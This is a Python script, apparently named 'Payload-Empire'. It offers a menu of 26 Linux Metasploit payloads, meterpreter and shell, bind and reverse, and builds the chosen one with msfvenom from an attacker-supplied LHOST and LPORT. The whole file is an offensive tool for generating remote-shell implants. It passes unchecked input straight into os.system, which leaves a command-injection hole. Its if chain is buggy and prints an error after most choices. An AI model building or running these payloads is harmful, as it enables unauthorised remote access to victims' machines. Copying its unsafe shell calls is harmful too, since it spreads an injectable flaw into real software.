from colorama import Fore
import os

os.system('clear')

def lin():
    print( 
    f"""{Fore.CYAN}
    Choose a payload:
    {Fore.GREEN}
         1- payload/linux/x64/meterpreter/bind_tcp
         2- payload/linux/x64/meterpreter/reverse_tcp
         3- payload/linux/x64/meterpreter_reverse_http
         4- payload/linux/x64/meterpreter_reverse_https
         5- payload/linux/x64/meterpreter_reverse_tcp
         6- payload/linux/x64/shell/bind_tcp
         7- payload/linux/x64/shell/reverse_tcp
         8- payload/linux/x64/shell_bind_ipv6_tcp
         9- payload/linux/x64/shell_bind_tcp
        10- payload/linux/x64/shell_bind_tcp_random_port
        11- payload/linux/x64/shell_find_port
        12- payload/linux/x64/shell_reverse_ipv6_tcp
        13- payload/linux/x64/shell_reverse_tcp
        14- payload/linux/x86/meterpreter/bind_ipv6_tcp
        15- payload/linux/x86/meterpreter/bind_ipv6_tcp_uuid
        16- payload/linux/x86/meterpreter/bind_nonx_tcp
        17- payload/linux/x86/meterpreter/bind_tcp
        18- payload/linux/x86/meterpreter/bind_tcp_uuid
        19- payload/linux/x86/meterpreter/find_tag
        20- payload/linux/x86/meterpreter/reverse_ipv6_tcp
        21- payload/linux/x86/meterpreter/reverse_nonx_tcp
        22- payload/linux/x86/meterpreter/reverse_tcp
        23- payload/linux/x86/meterpreter/reverse_tcp_uuid
        24- payload/linux/x86/meterpreter_reverse_http
        25- payload/linux/x86/meterpreter_reverse_https
        26- payload/linux/x86/meterpreter_reverse_tcp
    """)
    
    payload = input(Fore.GREEN + "Payload-Empire:~# ")

    if payload == '1':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x64/meterpreter/bind_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '2':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '3':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x64/meterpreter_reverse_http LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '4':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x64/meterpreter_reverse_https LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '5':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x64/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '6':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x64/shell/bind_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '7':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x64/shell/reverse_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '8':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x64/shell_bind_ipv6_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '9':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x64/shell_bind_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '10':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x64/shell_bind_tcp_random_port LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '11':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x64/shell_find_port LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '12':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x64/shell_reverse_ipv6_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '13':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '14':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x86/meterpreter/bind_ipv6_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '15':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x86/meterpreter/bind_ipv6_tcp_uuid LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '16':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x86/meterpreter/bind_nonx_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '17':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x86/meterpreter/bind_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '18':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x86/meterpreter/bind_tcp_uuid LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '19':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x86/meterpreter/find_tag LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '20':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x86/meterpreter/reverse_ipv6_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '21':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x86/meterpreter/reverse_nonx_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '22':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '23':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x86/meterpreter/reverse_tcp_uuid LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '24':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x86/meterpreter_reverse_http LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '25':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x86/meterpreter_reverse_https LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '26':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/linux/x86/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -o {name}")

    else:
        print(Fore.RED + "[!]ERROR")